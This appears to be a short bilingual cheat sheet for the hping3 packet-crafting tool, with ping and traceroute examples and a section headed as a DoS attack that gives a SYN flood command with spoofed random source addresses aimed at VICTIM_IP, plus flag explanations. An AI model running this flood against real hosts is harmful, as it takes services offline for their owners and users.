# hping3
## 基本概念
hping3 is a network tool able to send custom TCP/IP packets and to display target replies like ping program does with ICMP replies. 
hping3 handle fragmentation, arbitrary packets body and size and can be used in order to transfer files encapsulated under supported protocols. 
Using hping3 you are able to perform at least the following stuff:
* Test firewall rules
* Advanced port scanning
* Test net performance using different protocols, packet size, TOS (type of service) and fragmentation.
* Path MTU discovery
* Transferring files between even really fascist firewall rules.
* Traceroute-like under different protocols.
* Firewalk-like usage.
* Remote OS fingerprinting.
* TCP/IP stack auditing.
* A lot of others

## 示例
### testing using icmp
模拟ping的操作行为
```sh
# hping3 -1 -c 4 baidu.com
HPING baidu.com (enp0s3 220.181.57.216): icmp mode set, 28 headers + 0 data bytes
len=46 ip=220.181.57.216 ttl=53 id=22131 icmp_seq=0 rtt=40.5 ms
len=46 ip=220.181.57.216 ttl=53 id=22132 icmp_seq=1 rtt=32.0 ms
len=46 ip=220.181.57.216 ttl=53 id=22133 icmp_seq=2 rtt=31.9 ms
len=46 ip=220.181.57.216 ttl=53 id=22134 icmp_seq=3 rtt=37.8 ms

--- baidu.com hping statistic ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 31.9/35.6/40.5 ms

```
### traceroute using icmp
模拟traceroute
```sh
# hping3 -nn  --traceroute -V -1 baidu.com
```
### dos攻击
```sh
hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP
```
* --flood: sent packets as fast as possible. Don't show replies.
* --rand-dest: random destionation address mode. see the man.
* -V <-- Verbose
* -c --count: packet count
* -d --data: data size
* -S --syn: set SYN flag
* -w --win: winsize (default 64)
* -p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec
* -s --baseport: base source port (default random)
